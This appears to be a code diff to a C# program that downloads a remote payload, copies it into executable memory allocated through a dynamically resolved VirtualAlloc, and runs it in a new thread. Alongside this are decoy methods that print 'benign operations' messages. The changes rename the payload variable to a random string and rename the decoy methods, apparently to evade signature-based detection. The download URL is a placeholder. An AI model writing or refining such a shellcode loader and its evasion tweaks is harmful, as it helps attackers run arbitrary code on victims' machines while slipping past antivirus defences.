@@ -9,13 +9,13 @@ class Program
         string downloadLink = "[DOWNLOAD_LINK]";
 
         WebClient wc = new WebClient();
-        byte[] payload = wc.DownloadData(downloadLink);
+        byte[] sfhbsgjhgjghhbsjbvejs = wc.DownloadData(downloadLink);
 
         IntPtr addr = GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualAlloc");
         VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(VirtualAllocDelegate));
-        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sfhbsgjhgjghhbsjbvejs.Length, 0x3000, 0x40);
 
-        Marshal.Copy(payload, 0, mem, payload.Length);
+        Marshal.Copy(sfhbsgjhgjghhbsjbvejs, 0, mem, sfhbsgjhgjghhbsjbvejs.Length);
 
         IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
 
@@ -26,9 +26,9 @@ class Program
 
     static void ExecuteOps()
     {
-        BenignopClass.Op1();
-        BenignopClass.Op2();
-        BenignopClass.Op3();
+        BenignopClass.Opk1();
+        BenignopClass.Opk2();
+        BenignopClass.Opk3();
     }
 
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -48,18 +48,18 @@ class Program
 
 class BenignopClass
 {
-    public static void Op1()
+    public static void Opk1()
     {
-        Console.WriteLine("Initializing benign operations...");
+        Console.WriteLine("patch Initializing benign operations...");
     }
 
-    public static void Op2()
+    public static void Opk2()
     {
-        Console.WriteLine("Executing harmless functions...");
+        Console.WriteLine("patch Executing harmless functions...");
     }
 
-    public static void Op3()
+    public static void Opk3()
     {
-        Console.WriteLine("Completing routine tasks...");
+        Console.WriteLine("patch Completing routine tasks...");
     }
 }
